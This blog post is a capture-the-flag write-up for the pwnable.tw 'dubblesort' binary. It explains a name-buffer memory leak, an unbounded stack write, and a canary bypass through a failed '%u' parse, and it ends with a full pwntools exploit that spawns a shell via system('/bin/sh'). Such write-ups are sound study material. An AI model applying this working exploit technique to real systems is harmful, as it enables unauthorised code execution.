---
layout: post
title:  "Pwnable.tw - dubblesort"
date:   2024-12-30 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## dubblesort

```bash
$ checksec ./dubblesort
[*] '/home/itay/projects/pwnable_tw/dubblesort/dubblesort'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
$ file dubblesort
dubblesort: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=12a217baf7cbdf2bb5c344ff14adcf7703672fb1, stripped
```

Full mitigations 32-bit binary.

## Overview

The program asks for username, number of elements to sort, and the elements themselves. 
It then produces an output of the sorted elements array. \
There are many sus notes:

1. The program reads `0x40` bytes into the `0x40` name buffer. Hence, no room for the null terminator, producing an untruncated string. It can be useful in order to leak the preceding bytes. Another vuln might be the fact that this array isn't initialized to `\x00`.

2. No checks regarding the elements array size. It can be both a very large number, or the special case of `0`. 

3. While reading the numbers array, they are being stored within `int[8]` static array on the stack. What would happen if we'd read more than 8 elements..? Probably OOB-RW.

4. Related to above - within the reading loop's body, there seems to be a redundant assignment of stack local variables. However, if we can corrupt the values past the `int[8]` array, this assignment may have some interesting impact.

5. Also regarding the numbers reading - notice that it uses the `"%u"` format specifier to read the numbers. However, in case we would insert some unlegitimate byte, such as `'A'`, parsing won't occur, and the number's value would remain uninitialized. Indeed, when I've entered `A` character as the number, the program had leaked tons of memory as `Result`.

6. Although defined with unsigned format specifier, the numbers defined as `int`s, and can be negative. 

7. Within the process routine, the `size` is defined as `int`, not unsigned. This may have critical impact, as `nums_arr[size -1]` is being accessed, possibly performing OOB BEFORE the array's start. 


## Exploitation

### Debug Environemnt

Because we're given a partciular version of `libc`, we shall patch the binary to use it instead - and mimic the remote environment accurately.

```bash
patchelf --replace-needed libc.so.6 ./libc.so.6 "./dubblesort"
```

However, this approach didn't seem to work, and the following error occured:

```bash
Inconsistency detected by ld.so: dl-call-libc-early-init.c: 37: _dl_call_libc_early_init: Assertion `sym != NULL' failed!
```

I've also tried using `LD_LIBRARY_PATH=. ./dubblesort`, as well as `LD_PRELOAD=./libc.so.6 ./dubblesort`, 
having the exact same output. Therefore, the mismatch between `ld` and `libc` version is critical. \
Hence, my next goal is to retireve a matching `ld.so`.

The following interesting grep gave me some kind of hint:

```bash
$ strings libc.so.6  | grep "stable release"
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu5) stable release version 2.23, by Roland McGrath et al.
```

So this glibc-2.23 is expected to run on some older ubuntu machine. \
Its official page is `https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu5`, 
and **it seems to be part of the `xenial` distribution.**
Apparently there's an amazing tool - [glibc-all-in-one][glibc-all-in-one], which helps to debug & compile glibc easily. 

```bash
git clone https://github.com/matrix1001/glibc-all-in-one.git
cd glibc-all-in-one
./update_list

mkdir debs
mkdir -p libs/2.23-ubuntu5_i386
cd debs
wget https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu5/+build/11213404/+files/libc6_2.23-0ubuntu5_i386.deb
cd ..
./extract debs/libc6_2.23-0ubuntu5_i386.deb libs/2.23-0ubuntu5_i386
```

Now our desired `ld.so` resides under `libs/`! Using the following `patchelf` commands, we can mimic the exact remote environment:

```bash
#!/bin/sh

BINARY="./dubblesort"
cp $BINARY "${BINARY}.bk"
patchelf --set-interpreter ./ld-2.23.so $BINARY
patchelf --replace-needed libc.so.6 ./libc_32.so.6 $BINARY
```

Now we can finally run the binary locally, without any errors!

### Read Primitive

Because the primitive we have is linear stack overflow, we must achieve a stack read primitive. 
Leaking `libc` and potentially the program's base address would probably also serve us within the exploitation. \
Recall the first vuln, where the given `name` string is untruncated. 
This indeed results with an OOB-R, however - notice the stack canary is the consecutive dword for this name buffer:

```bash
0xff85b6b0:     0xf6852608      0x00000009      0xff85b71c      0x41414141
0xff85b6c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xff85b6d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xff85b6e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xff85b6f0:     0x41414141      0x41414141      0x41414141      0xacdfa700
```

A smart design decision of the stack canary, was to have its `LSB` always set to `\x00`, preventing leaks just like this. 
Therefore, we won't be able to leak information this way. \
However, recall there's another bug, as the name array wasn't initialized at all. What if we would send a very short string? \
Unfortunately, sending an empty buffer (0 bytes) halts the program. Hence, we need to send at least 1 byte in order for the `read` call to be non-blocking. 
In this example, I've sent a single `b'A'`, which is stored within `0xff8e73cc`. This gives us a partial stack leak primitive:

```bash
pwndbg> x/20wx $esp
0xff8e7390:     0x590d9bfa      0xff8e73a8      0xff8e73cc      0x00000000
0xff8e73a0:     0x00000000      0x00000000      0x00000000      0xf59af000
0xff8e73b0:     0xf5976570      0xffffffff      0x590d9034      0xf59786d0
0xff8e73c0:     0xf59af608      0x00000009      0xff8e742c      0xff8e7541
0xff8e73d0:     0x00000000      0x00000000      0x01000000      0x00000009
```

Because of the `'%s'` format specifier, 4 bytes would be leaked - `0xff8e7541`. Of course, the LSB is corrupted. 
However, notice that ASLR doesn't affect the lowest nibble, hence it should be some constant value we can easily brute force. \
An optimization for the above approach, would be to overwrite up to some other interesting addresses, and by doing so - also leaking `libc` addresses:

```bash
0xff8e73c0:     0xf59af608      0x00000009      0xff8e742c      0xff8e7541
0xff8e73d0:     0x00000000      0x00000000      0x01000000      0x00000009
0xff8e73e0:     0xf5976570      0x00000000      0xf57414be      0xf5953054
0xff8e73f0:     0xf59704a0      0xf5988f90      0xf57414be      0xf59704a0
0xff8e7400:     0xff8e7440      0xf597066c      0xf5970b40      0x37ac2f00
```

In this example, if we would overwrite `0x34` bytes, we would leak stack address, 
`0xff8e7440`, along with 2 preceding `libc` addresses. 
Note, that doing this large overwrite is preferred, as this way there's lesser chance of one of the randomized bytes in between to be a null termination, 
possibly truncation the output and damaging the exploit's statistics. 

Interestingly, upon remote-debugging the binary, I've noticed the stack layout was completely different. 
I've sent a single `'A'` character, and got the following:

```bash
[*] leak: 0xf76dd041
[*] leak: 0xffef0f21                                                 [*] leak: 0x6f482c2f
[*] leak: 0x616d2077
[*] leak: 0x6e20796e
[*] leak: 0x65626d75
[*] leak: 0x64207372
[*] leak: 0x6f79206f
[*] leak: 0x68772075
[*] leak: 0x74207461
[*] leak: 0x6f73206f
[*] leak: 0x3a207472
```

This means that the first dword is a libc leak, and the second - a stack leak. \
Moreover, the preceding string `"How many numbers do you what to sort :"` actually resides within the stack!.
Hence, it seems to be copied from the .rodata segment, probably as part of the `FORTIFY_SOURCE` extra runtime checks. \
Unfortunately, even though I've used the same `libc` version, and a matching `ld`, a similar yet different stack layout was produced.
I assume the usage of `patchelf` have completely changed the `.rodata` segment, hence produced completely different stack state. \
Hence, my next debugging step was to setup a relevant ubuntu-xenial docker image!

### Debug Environment 2 - Docker!

I've wrote the following `Dockerfile`:

```bash
FROM ubuntu:xenial@sha256:bcb8397f1390f4f0757ca06ce184f05c8ce0c7a4b5ff93f9ab029a581192917b
ARG id=1000
ARG user=dubblesort

RUN apt-get update && \
        apt-get install -y sudo binutils curl gdb gdbserver && \
        addgroup --gid $id $user && \
        adduser --uid $id --gid $id --disabled-password --gecos "" $user && \
        echo '${user} ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

COPY ./ld-2.23.so /lib/ld-linux.so.2
COPY ./libc_32.so.6 /lib/i386-linux-gnu/libc.so.6

USER ${user}
WORKDIR /home/${user}
COPY --chown=${user}:${user} ./dubblesort /home/${user}/dubblesort
```

And built it via `sudo docker build -t ubuntu-dubblesort .` . Notice - I must've changed to `uid=1000` user. 
Otherwise, spawned processes within the docker image were treated as root's. 

After building the image, I've created and runned the container:

```bash
sudo docker run -p 9090:9090 --rm --cap-add=SYS_PTRACE --security-opt seccomp=unconfined -it --name xenial ubuntu-dubblesort
```

That way, **we do not use patchelf at all**, hence - running the original binary, with its original libc, and an adequate `ld`! \
Keep in mind, that the exact `ld + libc` pair must be used. Otherwise, the docker machine would be wrecked, 
and even calls to `ls` would segfault. \
While this approach worked perfectly, and allowed debugging the container's binary from the host, pwntools didn't like it. 

### Debug Environment 3 - Pwntools + GDB scripting

Another alternative, is to debug on the host machine, using overwritten `ld` and `libc`:

```python
p = gdb.debug([LD, BINARY], env={"LD_PRELOAD": LIBC}, gdbscript=GDB_SCRIPT)
```

Because this is the simplest solution, and it doesn't patches the ELF at all, I've chose this route :) \
Notice that the gdb script doesn't naively works. Because we've changed the loader, the first instruction that we're 
being breaked at, is the custom loader's entry point. Hence, at this point our binary wasn't even loaded to memory, 
and we cannot break on `_start`:

```bash
pwndbg> info proc mappings
process 47372
Mapped address spaces:

        Start Addr   End Addr       Size     Offset  Perms   objfile
        0xf2bbd000 0xf2bc1000     0x4000        0x0  r--p   [vvar]
        0xf2bc1000 0xf2bc3000     0x2000        0x0  r-xp   [vdso]
        0xf2bc3000 0xf2be5000    0x22000        0x0  r-xp   /home/itay/projects/pwnable_tw/dubblesort/ld-2.23.so
        0xf2be6000 0xf2be8000     0x2000    0x22000  rw-p   /home/itay/projects/pwnable_tw/dubblesort/ld-2.23.so
        0xffb88000 0xffba9000    0x21000        0x0  rw-p   [stack]
pwndbg> p $eip
$1 = (void (*)()) 0xf2bc3ac0
```

Indeed, `readelf -h ./ld-2.23.so` shows that the loader's entry point is indeed `0xac0`. \
A very cool trick we can do, in order to properly debug the binary, is to issue the following gdb script:

```bash
ni
ni
fin
```

By doing so, we enter the first new function frame called by the loader (which is the main routine that loads the binary),
and by calling `fin` - we wait just after the binary was successfully loaded:

```bash
pwndbg> info proc mappings
process 47442
Mapped address spaces:

        Start Addr   End Addr       Size     Offset  Perms   objfile
        0xecdd6000 0xecdd7000     0x1000        0x0  rw-p
        0xecdd7000 0xecf84000   0x1ad000        0x0  r-xp   /home/itay/projects/pwnable_tw/dubblesort/libc.so.6
        0xecf84000 0xecf85000     0x1000   0x1ad000  ---p   /home/itay/projects/pwnable_tw/dubblesort/libc.so.6
        0xecf85000 0xecf87000     0x2000   0x1ad000  r--p   /home/itay/projects/pwnable_tw/dubblesort/libc.so.6
        0xecf87000 0xecf88000     0x1000   0x1af000  rw-p   /home/itay/projects/pwnable_tw/dubblesort/libc.so.6
        0xecf88000 0xecf8d000     0x5000        0x0  rw-p
        0xecf8d000 0xecf8e000     0x1000        0x0  r-xp   /home/itay/projects/pwnable_tw/dubblesort/dubblesort
        0xecf8e000 0xecf8f000     0x1000        0x0  r--p   /home/itay/projects/pwnable_tw/dubblesort/dubblesort
        0xecf8f000 0xecf90000     0x1000     0x1000  rw-p   /home/itay/projects/pwnable_tw/dubblesort/dubblesort
        0xecf90000 0xecf94000     0x4000        0x0  r--p   [vvar]
        0xecf94000 0xecf96000     0x2000        0x0  r-xp   [vdso]
        0xecf96000 0xecfb8000    0x22000        0x0  r-xp   /home/itay/projects/pwnable_tw/dubblesort/ld-2.23.so
        0xecfb8000 0xecfb9000     0x1000        0x0  rw-p
        0xecfb9000 0xecfba000     0x1000    0x22000  r--p   /home/itay/projects/pwnable_tw/dubblesort/ld-2.23.so
        0xecfba000 0xecfbb000     0x1000    0x23000  rw-p   /home/itay/projects/pwnable_tw/dubblesort/ld-2.23.so
        0xffd72000 0xffd93000    0x21000        0x0  rw-p   [stack]
```

Cool, now we can put breakpoints on our program's addresses :)
However, we haven't done yet! Because there are no binary debugging symbols, we cannot simply `bp main / _start`! 
The trick is to break on a libc address, and `__libc_start_main` in particular, and fetch `main`'s address off the stack. \
TL;DR : the following script would allow us to break on `main`:

```bash
GDB_SCRIPT = '''
ni
ni
fin
tb __libc_start_main
commands
    p/x *(int *)($esp + 4)
    b *$1
    c
end

c
'''
```

Also notice that the first 4 bytes of `libc` leak were still not reproduced on local debug. 
I assume it is related to the environment `LD_PRELOAD` being on the stack, changing some of the offsets there. 
We can still debug without the `libc` leak, but we have to keep in mind we have to find the exact offset on the remote. \
Another option is to just find a different offset, and give up on the stack leak (as we probably dont even need it). \
Indeed, I've found similar local & remote offsets, both represeting the same libc-leak address

### Stack Write

The main vulnerability of this challenge seems to be the fact that we can write infinite amount of numbers to the 8-slot size array, and sort all of them. \
This means the primitive is pretty limited - we can write any data we want into the stack, but it would get sorted, being interpreted as 4-byte uints. \
The main obstacle is the fact that while we want to overwrite the return address and perform easy-win ROP (by jumping to `libc`), 
the stack canary wrecks us. \
There are few possible cool ideas:

1. If theres a stack canary somewhere upper in the stack, such as due to some other function call, we may simply sort it to our desired slot!

2. While we corrupt the outermost main's frame stack, notice the inner function that actually performs the sort, is also guarded with a stack canary - and this is the exact same canary. Hence, if we can make sure the innermost frame would get sorted, such that the inner frame's canary would be written at the outer frame's canary address, we would bypass this check. 

3. Recall what happens when we send a bad character, such as `'A'` to `stdin`, such that it will be parsed by `printf("%u")`. In that case, **the character would remain within the IO-stdin buffer, while leaving the corresponding memory untouched**. We can exploit this mechanism, such that the canary won't be overwritten, yet we would write libc addresses past it!

After some debugging, I've chose option(3), which is a very cool vuln. \
Simply setting small ROP chain to jump back to libc, and we get a shell. 

## Solution

The following script works both locally and remote :) \
Notice that because the canary's value is randomized, it is being sorted to different addresses. 
Hence, this have to be runned multiple times to obtain the flag. 

```python
#!/usr/bin/python3

from pwn import *

HOST = 'chall.pwnable.tw'
PORT = 10101
context.arch='i386'
BINARY = './dubblesort'
LIBC = './libc.so.6'
LD = './ld-2.23.so'
# GDB_SCRIPT = '''
# ni
# ni
# fin
# tb __libc_start_main
# commands
#     p/x *(int *)($esp + 4)
#     b *$1
#     c
# end

# c
# '''

GDB_SCRIPT = '''
b *main-0x9c3+0x965

c
'''

# Constants
IS_DEBUG = False 
IS_REMOTE = True
NAME_LEAK_SIZE = 0x19 if IS_DEBUG else 0x1d
NUMBERS_SIZE = 0x18

# Offsets
LIBC_LEAK_TO_BASE = 0x1b0000

# Addresses
libc = ELF(LIBC)
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
log.info(f'bin_sh: {hex(bin_sh)}')
log.info(f'system: {hex(system)}')

libc_rop = ROP(LIBC)
pop_eax_ret = libc_rop.eax.address
pop_ebx_ret = libc_rop.ebx.address
pop_ecx_ret = libc_rop.ecx.address
pop_edx_ret = libc_rop.edx.address
leave_ret = libc_rop.find_gadget(['leave']).address
int_80 = libc_rop.find_gadget(['int 0x80']).address
log.info(f'pop_eax_ret: {hex(pop_eax_ret)}')
log.info(f'pop_ebx_ret: {hex(pop_ebx_ret)}')
log.info(f'pop_ecx_ret: {hex(pop_ecx_ret)}')
log.info(f'pop_edx_ret: {hex(pop_edx_ret)}')
log.info(f'leave_ret: {hex(leave_ret)}')
log.info(f'int_80: {hex(int_80)}')

def unsigned(n, bitness=32):
    if n < 0:
        n = n + 2**bitness
    return n

def pad(buf, alignment, delimiter=b'\x00'):
    if (len(buf) % alignment) == 0:
        return buf

    extra = (alignment - (len(buf) % alignment)) * delimiter
    return buf + extra

def splitted(buf, n):
    for i in range(0, len(buf), n):
        yield buf[i: i + n]

def recvPointer(p, sizeof_ptr = 4):
    leak = p.recv(sizeof_ptr)
    assert(len(leak) == sizeof_ptr)
    leak = u32(leak)
    return leak

def get_libc_base(p):
    p.recvuntil(b'What your name :')
    name = b'A' * NAME_LEAK_SIZE
    p.send(name)
    p.recvuntil(b'Hello ' + name[:-1])
    
    libc_leak = recvPointer(p) - ord('A')
    libc_base = libc_leak - LIBC_LEAK_TO_BASE
    log.info(f'libc_leak: {hex(libc_leak)} libc_base: {hex(libc_base)}')
    assert((libc_base & 0xfff) == 0)

    p.recvuntil(b',How many numbers do you what to sort :')
    return libc_base 

def sendNumbers(p, nums, size):
    p.sendline(str(size).encode())
    p.recvuntil(b'Enter the 0 number : ')
    buf = b''
    for num in nums:
        buf += str(num).encode() + b' '
   
    # Critical - printf("%u") fails parsing this character, leaving uninitialized memory, while the character remains within the stdin buffer!
    buf += b'A'  
    p.sendline(buf)

def exploit(p):
    libc_base = get_libc_base(p)
    # This number is larger than the canary, yet smaller than all of libc's addresses
    large_num = libc_base - 0x1000

    # First, fill crap
    libc_bin_sh = libc_base + bin_sh
    libc_system = libc_base + system
    nums = [libc_system] * 7 + [libc_bin_sh] * 9
    nums += [1] * (NUMBERS_SIZE - len(nums))

    sendNumbers(p, nums, len(nums) + 32)


def main():
    if IS_DEBUG:
        # p = gdb.debug([LD, BINARY], env={"LD_PRELOAD": LIBC}, gdbscript=GDB_SCRIPT)
        p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
        # pid = int(process('pgrep -f "./dubblesort"', shell=True).readline()[:-1])
        # p = gdb.attach(pid, gdbscript=GDB_SCRIPT)
    else:
        if IS_REMOTE:
            p = remote(HOST, PORT)
        else:
            p = process([LD, BINARY], env={"LD_PRELOAD": LIBC})

    exploit(p)

    log.info('Win')
    p.interactive()

if __name__ == '__main__':
    main()
```

[glibc-all-in-one]: https://github.com/matrix1001/glibc-all-in-one
